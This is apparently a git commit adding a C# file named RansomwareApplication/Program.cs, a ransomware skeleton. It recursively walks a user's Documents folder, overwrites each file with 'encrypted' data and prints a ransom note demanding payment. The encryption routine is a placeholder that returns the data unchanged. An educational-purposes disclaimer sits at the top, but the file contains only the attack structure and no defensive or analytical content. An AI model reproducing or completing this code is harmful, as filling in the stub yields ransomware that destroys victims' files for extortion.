6e9491d54d994275e7129b88a796de41f64f2198
Mr Zero <nguyenhoangtai2k@gmail.com>
2023-12-19 16:13:02 +0700

    Add project files.

---
+++ RansomwareApplication/Program.cs
@@ -0,0 +1,43 @@
+﻿using System;
+using System.IO;
+
+namespace RansomwareApplication
+{
+    /*
+     Note: This code is for educational purposes only. Writing and distributing ransomware is illegal and unethical.
+     */
+
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string targetDirectory = @"C:\Users\TargetUser\Documents";
+            string ransomNote = "Your files have been encrypted. Pay the ransom to get the decryption key.";
+
+            EncryptFiles(targetDirectory);
+            DisplayRansomNote(ransomNote);
+        }
+
+        static void EncryptFiles(string directory)
+        {
+            string[] files = Directory.GetFiles(directory, "*.*", SearchOption.AllDirectories);
+
+            foreach (string file in files)
+            {
+                byte[] encryptedData = EncryptData(File.ReadAllBytes(file));
+                File.WriteAllBytes(file, encryptedData);
+            }
+        }
+
+        static byte[] EncryptData(byte[] data)
+        {
+            // Encryption logic goes here
+            return data;
+        }
+
+        static void DisplayRansomNote(string note)
+        {
+            Console.WriteLine(note);
+        }
+    }
+}
